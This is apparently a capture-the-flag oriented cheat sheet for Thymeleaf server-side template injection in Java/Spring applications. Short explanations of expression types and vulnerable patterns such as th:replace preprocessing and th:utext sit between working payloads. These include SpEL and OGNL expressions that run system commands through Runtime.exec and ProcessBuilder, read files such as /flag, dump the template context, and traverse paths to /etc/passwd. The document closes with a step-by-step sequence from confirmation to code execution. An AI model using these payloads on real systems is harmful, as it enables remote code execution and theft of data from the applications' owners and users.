# Thymeleaf — Java/Spring template engine

Marker: `*{7*7}` or `#{7*7}` inside `th:*` attributes, or
`[[${7*7}]]` inline. Thymeleaf injection usually comes through
fragment-name or attribute-value expressions — SpEL underneath.

---

## 1. The three expression families

```html
${...}    -- variable expressions → Spring EL (SpEL!)
*{...}    -- selection expressions (on th:object-selected object)
#{...}    -- message expressions (i18n — resource bundles)
@{...}    -- link expressions
~{...}    -- fragment expressions — the classic injection surface
```

The famous path: `~{${x}}` or `__${x}__` preprocessing —
user-controlled FRAGMENT name gets SpEL-evaluated:

```html
<p th:replace="__${x}__">      -- x = user input → SpEL eval
```

`__${...}__` — the `__` wrapping marks preprocessing — the inner
`${}` evaluates the string AS an expression → arbitrary SpEL.

---

## 2. SpEL — the payload language

```thymeleaf
*{7*7}
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('cat /flag')}
*{new java.util.Scanner(new java.io.File('/flag')).next()}
*{T(org.springframework.util.StreamUtils).copyToString(
   new java.io.FileInputStream('/flag'), T(java.nio.charset.Charset).defaultCharset())}
```

`T(Type)` — SpEL's type accessor. `T(java.lang.Runtime)` →
Runtime class → getRuntime().exec() → RCE.

---

## 3. The `__${}__` preprocessing injection — the CTF shape

```html
<!-- vulnerable pattern: -->
<div th:replace="__${fragment}__">
<!-- or -->
<div th:utext="${msg}">
```

`th:utext` renders UNESCAPED — HTML in the value parses → XSS path.
`th:replace="__${x}__"` evaluates x as an expression → SpEL.

```java
// controller-side vulnerable:
model.addAttribute("fragment", userInput);
// template: th:replace="__${fragment}__"
// → userInput = "users :: list"  → includes that fragment
// → userInput = "${T(java.lang.Runtime)..." → SpEL injection
```

The flag-read via SpEL without exec:

```java
*{new java.util.Scanner(T(java.lang.ClassLoader).getSystemResourceAsStream('/flag')).useDelimiter('\\Z').next()}
*{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))}
*{T(java.lang.ClassLoader).getSystemResource('/flag')}
```

---

## 4. The `#{...}` message-source path — i18n injection

```text
#{x} resolves against resource bundles — not code-exec itself
   BUT the resolved message can contain ${}-interpolated args
```

Lower priority — message bundles are rarely attacker-writable.

---

## 5. OGNL adjacency — Thymeleaf 2.x used OGNL not SpEL

Thymeleaf 2.x's `${}` was OGNL — same `T()`/`new` tricks but the
OGNL syntax (`ognl.md`-style):

```java
%{(new java.lang.ProcessBuilder('id')).start()}
%{#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

Thymeleaf 3.x = SpEL. Version-check via error messages or the
`thymeleaf.version` if exposed.

---

## 6. The context-signatures — where input lands

```html
th:text="${x}"     -- escaped text — no markup, but SpEL evaluates!
th:utext="${x}"    -- UNescaped — HTML in x renders → XSS path
th:replace="__${x}__"  -- preprocessing — expression eval
th:fragment="${x}"
th:with="x=${y}"
th:each="i : ${list}"
th:if="${x}"
th:href="${x}"     -- URL context — javascript: works if unescaped
th:src="${x}"
```

`th:text` evaluates the expression AND escapes output — SpEL runs,
result renders safely. `th:utext` = eval + unescaped = full XSS.

---

## 7. The Spring-MVC return-string variant — path injection

```java
// controller returns a template NAME from user input:
return userInput;   // → "redirect:..." or a template path
   // → "redirect:javascript:..." or template-file traversal
   // → path to /templates/../../etc/passwd
```

Return-value injection is the OTHER Spring SSTI shape — not
`th:`-attr but the view-name itself.

---

## 8. The quick sequence

```thymeleaf
*{7*7}                                          -- SpEL confirm
${7*7}                                          -- var-expr confirm
*{T(java.lang.Runtime).getRuntime().exec('id')}  -- RCE
*{new java.util.Scanner(new java.io.FileInputStream('/flag'))
  .useDelimiter('\\Z').next()}                    -- file read
${#ctx}                                          -- context dump
```
